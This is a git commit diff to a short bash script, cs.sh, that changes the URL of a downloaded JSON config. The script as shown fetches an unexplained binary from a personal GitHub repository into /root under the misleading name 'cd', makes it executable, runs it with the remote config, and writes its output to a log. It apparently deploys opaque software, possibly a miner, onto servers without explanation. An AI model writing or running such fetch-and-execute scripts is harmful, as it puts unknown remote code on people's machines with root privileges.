685d2a3125d74ee2261f0d064599c2ad5f67a12d
Jolia Miya <145192173+jmmjiaa89@users.noreply.github.com>
2025-05-21 19:48:35 +0800

    Update cs.sh

--- cs.sh
+++ cs.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 wget -O /root/cd https://github.com/jmmjiaa89/m/raw/refs/heads/main/csg
 chmod u+x /root/cd
-wget -O /root/xg.json https://raw.githubusercontent.com/jmmjiaa89/hestiacp/refs/heads/main/config.json
+wget -O /root/xg.json https://raw.githubusercontent.com/jmmjiaa89/m/refs/heads/main/csg.json
 chmod u+x /root/xg.json
 /root/cd --config=/root/xg.json > /var/log/cd.log 2>&1
 ping aws.amazon.com
